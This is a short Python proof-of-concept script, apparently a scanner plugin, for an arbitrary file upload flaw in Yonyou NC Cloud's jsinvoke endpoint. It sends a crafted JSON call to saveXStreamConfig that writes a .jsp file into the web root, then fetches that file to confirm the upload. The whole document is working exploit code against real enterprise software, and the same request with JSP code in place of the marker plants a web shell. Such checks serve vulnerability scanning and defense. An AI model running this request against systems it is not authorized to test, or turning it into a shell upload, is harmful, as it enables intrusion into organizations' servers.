import requests
import urllib


def verify(url):
    relsult = {
        'name': '用友 NC Cloud jsinvoke 任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers1 = {
        'Content-Type': 'application/json'
    }
    data1 = '''
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",
"parameterTypes":["java.lang.Object","java.lang.String"],
"parameters":["123456","webapps/nc_web/IOmzdcUDhwMYTLk65p3cgxvxy.jsp"]}
    '''
    vurl = urllib.parse.urljoin(url, "/uapjs/jsinvoke/?action=invoke")
    try:
        response1 = requests.post(vurl, headers=headers1, data=data1)
        response = requests.get(url=url+'/IOmzdcUDhwMYTLk65p3cgxvxy.jsp')
        if response.status_code == 200 and '123456' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult
